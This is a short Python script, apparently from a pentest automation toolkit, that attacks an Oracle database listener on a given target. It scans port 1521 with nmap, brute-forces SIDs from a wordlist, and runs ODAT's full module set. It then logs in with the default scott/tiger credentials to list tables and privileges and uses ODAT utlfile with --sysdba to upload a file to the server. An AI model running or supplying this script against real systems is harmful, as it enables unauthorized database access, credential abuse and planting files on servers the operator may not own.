
from pathlib import Path
import subprocess

OUTPUT_DIR = Path("outputs")
OUTPUT_DIR.mkdir(exist_ok=True)

ODAT_SCRIPT = "odat.py"  #
WORDLIST   = "/usr/share/wordlists/oratools/sid.txt"  

def _outfile(target: str, suffix: str) -> Path:
    return OUTPUT_DIR / f"{target}_tns_{suffix}.txt"

def _run(cmd: list[str], dst: Path) -> None:
    print(f"[tns] ▶ {' '.join(cmd)}")
    with dst.open("w") as fh:
        subprocess.run(cmd, stdout=fh, stderr=subprocess.STDOUT, text=True, check=False)
    print(f"[tns] ✔ Output → {dst}")

def footprint(target: str) -> None:
    print(f"[+] Oracle TNS detected – launching TNS footprinting on {target}…")

    
    _run(
        ["nmap", "-p1521", "-sV", "--open", target],
        _outfile(target, "nmap_basic"),
    )

    
    _run(
        ["nmap", "-p1521", "-sV", "--script", "oracle-sid-brute", "--script-args",
         f"oracle-sid-brute.sidFile={WORDLIST}", target],
        _outfile(target, "nmap_sid_brute"),
    )

    
    _run(
        [ODAT_SCRIPT, "all", "-s", target],
        _outfile(target, "odat_all"),
    )

   
    sql_cmds = (
        "SET PAGESIZE 200;\n"
        "SELECT table_name FROM all_tables;\n"
        "SELECT * FROM user_role_privs;\n"
        "EXIT;\n"
    )
    _run(
        ["bash", "-c",
         f"echo \"{sql_cmds}\" | sqlplus -s scott/tiger@{target}/XE"],
        _outfile(target, "sqlplus_tables_roles"),
    )

   
    _run(
        [ODAT_SCRIPT, "utlfile", "-s", target, "-d", "XE",
         "-U", "scott", "-P", "tiger", "--sysdba",
         "--putFile", "testing.txt", "./testing.txt"],
        _outfile(target, "odat_putfile"),
    )

    print(f"[+] Oracle TNS footprinting complete for {target}.")
